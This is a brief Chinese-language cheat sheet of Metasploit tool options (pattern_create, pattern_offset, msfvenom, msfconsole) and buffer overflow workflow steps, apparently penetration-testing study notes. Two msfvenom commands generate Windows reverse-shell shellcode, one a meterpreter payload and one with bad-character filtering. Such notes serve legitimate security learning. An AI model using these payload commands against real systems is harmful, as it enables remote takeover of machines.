### msf-pattern_create

-l <=> --length 生成的字符串长度 

-s <=> --sets 自定义模式集

-h <=> --help 帮助



### msf-pattern_offset

-l <=> --length 生成的字符串长度 配合 msf-pattern_create

-q <=> --query 查询值 寄存器的值 十六进制

-s <=> --sets 自定义模式集

-h <=> --help 帮助

### msfvenom

LHOST

LPOST

-f <-> --format dll、exe 执行格式

-l <-> --list 列表

-p <-> --payload 载荷

-f <-> --format  执行格式

-e <-> --encoder 加密编码

-a <-> --arch 结构

-b <-> ---bad-chars 坏字节

-i <-> --iterations 编译次数

-t <-> --timeout 超时

-h <-> --help 帮助

-o <-> --out 保存

#### 例子

##### 生成反射 shellcode

msfvenom -p 'windows/meterpreter/reverse_tcp' LHOST='127.0.0.1' LPORT=1234 -f c

### msfconsole

#### API

search 搜索模块

use <module> 切换模块

show options 显示设置

set threads <count> 设置线程数

set rhosts <globalIp> 设置目标IP

set <arg> 设置参数

get <arg> 获取参数

run <=> exploit 启动运行

back 退出msf



### 缓存区溢出

#### 脏字符生成（Python，kali）

1.python生成800个字符

python print("A" * 800) 输出800个A

1.利用Metasploit中的插件生成800个脏数据

msf-pattern_create -l 800

#### 脏字符搜索

高低位搜索

msf-pattern_offset -l 800 -q 十六进制

#### 汇编代码转换机器代码

msf-nasm_shell

#### 搜索汇编Inmunity mona

!mona modules

!mona find -s '\x\x\x' -m "library"

#### 生成payload

msfvenom -p windows/shell_reverse_tcp LHOST=<addr> LPORT=<port> -f c -b '"\x\x\x"  EXITFUNC=thread